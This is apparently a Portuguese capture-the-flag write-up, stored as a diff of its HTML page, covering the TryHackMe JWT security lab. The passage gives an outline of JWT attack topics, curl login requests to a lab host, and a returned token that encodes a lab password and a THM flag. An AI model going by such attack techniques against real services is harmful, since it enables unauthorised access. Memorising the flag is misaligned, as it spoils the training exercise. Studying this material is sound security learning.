+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#what-is-the-name-used-for-encrypted-jwts">What is the name used for encrypted JWTs?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#divulga%c3%a7%c3%a3o-de-informa%c3%a7%c3%b5es-confidenciais">Divulgação de informações confidenciais
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo-1">Exemplo 1
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#erros-de-desenvolvimento">Erros de desenvolvimento
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#corre%c3%a7%c3%a3o">Correção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pergunta">Pergunta
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#what-is-the-flag-for-example-1">What is the flag for example 1?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#erros-de-valida%c3%a7%c3%a3o-de-assinatura">Erros de validação de assinatura
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#assinaturas-que-n%c3%a3o-s%c3%a3o-verificadas">Assinaturas que não são verificadas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo-2">Exemplo 2
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desenvolvimento-do-erro">Desenvolvimento do erro
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#corre%c3%a7%c3%a3o-1">Correção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#downgrading-para-none">Downgrading para None
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo-3">Exemplo 3
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desenvolvimento-do-erro-1">Desenvolvimento do erro
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#corre%c3%a7%c3%a3o-2">Correção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#segredos-sim%c3%a9tricos-fracos">Segredos simétricos fracos
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo-4">Exemplo 4
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desenvolvimento-do-erro-2">Desenvolvimento do erro
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#corre%c3%a7%c3%a3o-3">Correção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#confundindo-o-algoritmo-de-assinatura">Confundindo o algoritmo de assinatura
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#example-5">Example 5
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desenvolvimento-do-erro-3">Desenvolvimento do erro
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#corre%c3%a7%c3%a3o-4">Correção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-2">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#dura%c3%a7%c3%a3o-de-jwt">Duração de JWT
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo-6">Exemplo 6
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desenvolvimento-do-erro-4">Desenvolvimento do erro
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#corre%c3%a7%c3%a3o-5">Correção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#cross-service-relay-attacks">Cross-Service Relay Attacks
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo-7">Exemplo 7
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desenvolvimento-do-erro-5">Desenvolvimento do erro
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#corre%c3%a7%c3%a3o-6">Correção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#conclus%c3%a3o">Conclusão
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button id="backToTop" tabindex="-1" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>Voltar ao topo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--hextra-navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main id="content" class="hx:w-full hx:min-w-0 hextra-max-content-width hx:px-6 hx:pt-4 hx:md:px-12">
+        
+        
+        <br class="hx:mt-1.5 hx:text-sm" />
+        <h1 class="hx:text-center hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">JWT - Security - THM</h1>
+        <div class="hx:mb-16"></div>
+        <div class="content">
+          
+          <h2 data-hextra-search-id="objetivos">Objetivos<span class="hx:absolute hx:-mt-20" id="objetivos"></span>
+    <a href="#objetivos" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><ol>
+<li>Aprender sobre autenticação baseada em token.</li>
+<li>Aprender sobre JSON web tokens (JWTs).</li>
+<li>Aprender o porque JWT são populares.</li>
+<li>Aprender sobre segurança no uso de JWT.</li>
+<li>Aprender como atacar vulnerabilidade na implementação de JWT.</li>
+</ol>
+<h2 data-hextra-search-id="introdução">Introdução<span class="hx:absolute hx:-mt-20" id="introdução"></span>
+    <a href="#introdu%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Um dos motivos  da popularidade das API (Application Programming Interfaces) é sua vantagem  de ser usada em diversas interfaces diferentes, com uma única API podemos conversar com uma aplicação web ou mobile, simultaneamente se necessário, além disso, pensando pelo lado da segurança, podemos implementar controles mais centralizados do lado do servidor.
+Nesse artigo irei estudar e documentar, a aula disponível de JWT na plataforma TryHackMe.</p>
+<p><a
+    href="https://tryhackme.com/r/room/jwtsecurity"target="_blank" rel="noopener">Aula disponível aqui.</a></p>
+<h2 data-hextra-search-id="gerenciamento-de-sessão-baseado-em-token">Gerenciamento de Sessão baseado em Token.<span class="hx:absolute hx:-mt-20" id="gerenciamento-de-sessão-baseado-em-token"></span>
+    <a href="#gerenciamento-de-sess%c3%a3o-baseado-em-token" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>É algo relativamente novo, onde a aplicação web fornece um token dentro de uma requisição <code>body</code> , no lado do cliente o JavaScript lê essa informação e armazena o token localmente dentro da pasta do navegador. Quando o cliente realiza uma requisição o JavaScript carrega a informação do token armazenado localmente e anexa ao cabeçalho da requisição, o formato mais comum de token é o <strong>JWT (JSON Web Token)</strong>.</p>
+<p>Formato do cabeçalho:
+<code>Authorization: Bearer header</code></p>
+<h3 data-hextra-search-id="projeto-de-api">Projeto de API<span class="hx:absolute hx:-mt-20" id="projeto-de-api"></span>
+    <a href="#projeto-de-api" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>A API para estudo e documentação foi desenvolvida em Python Flask, sendo assim os códigos dos exemplos serão em Python.</p>
+<h4 data-hextra-search-id="apiendpoints">API Endpoints<span class="hx:absolute hx:-mt-20" id="apiendpoints"></span>
+    <a href="#apiendpoints" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>O projeto de API tem um único endpoint, exemplo <code>http://HOST/api/v1.0/exampleX</code>, o <code>X</code> é substituído pelo exemplo que estamos estudando. O endpoint é acessado usando dois métodos HTTP.</p>
+<p><strong>POST</strong>: Para autenticar e receber seu JWT você precisa realizar uma requisição POST, com as credenciais fornecidas em formato JSON.</p>
+<p><strong>GET</strong>: Para obter detalhes sobre seu usuário e, executar a escalação de privilégios.</p>
+<h4 data-hextra-search-id="credenciais-de-api">Credenciais de API<span class="hx:absolute hx:-mt-20" id="credenciais-de-api"></span>
+    <a href="#credenciais-de-api" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Para autenticar na API o payload em formato JSON deve ser enviado da seguinte forma:</p>
+<p><strong>username</strong>: nome de usuário
+<strong>password</strong>: senha<strong>X</strong></p>
+<h4 data-hextra-search-id="exemplos-de-api">Exemplos de API<span class="hx:absolute hx:-mt-20" id="exemplos-de-api"></span>
+    <a href="#exemplos-de-api" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Abaixo duas requisições, utilizando o <code>curl</code>.
+Para autenticação utilizamos a requisição abaixo:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;passwordX&#34; }&#39;</span> http://10.10.173.181/api/v1.0/exampleX</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><code>Content-Type: application/json</code>:  cabeçalho utilizado para comunicação entre sistemas, por exemplo cliente servidor, ele informa para navegador como interpretar o conteúdo enviado.</p>
+<p>Para verificação de usuário a requisição abaixo pode ser utilizada:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: Bearer [JWT token]&#39;</span> http://10.10.173.181/api/v1.0/example2?username<span style="color:#f92672">=</span>Y</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Onde <code>Y</code> após parâmetro <code>username</code> pode ser <code>user</code> ou <code>admin</code>.</p>
+<p><code>JWT token</code> : deve ser substituído pela resposta da primeira requisição.</p>
+<h4 data-hextra-search-id="exemplo-de-token">Exemplo de token<span class="hx:absolute hx:-mt-20" id="exemplo-de-token"></span>
+    <a href="#exemplo-de-token" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Quando realizamos uma requisição com usuário <code>user</code> recebemos um token, com usuário <code>admin</code> recebemos a mensagem de credenciais incorretas.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password1&#34; }&#39;</span> http://10.10.173.181/api/v1.0/example1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;admin&#34;, &#34;password&#34; : &#34;password1&#34; }&#39;</span> http://10.10.173.181/api/v1.0/example1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Incorrect Username or Password&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="perguntas">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas"></span>
+    <a href="#perguntas" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><h5 data-hextra-search-id="what-is-the-common-header-used-to-transport-the-jwt-in-a-request">What is the common header used to transport the JWT in a request?<span class="hx:absolute hx:-mt-20" id="what-is-the-common-header-used-to-transport-the-jwt-in-a-request"></span>
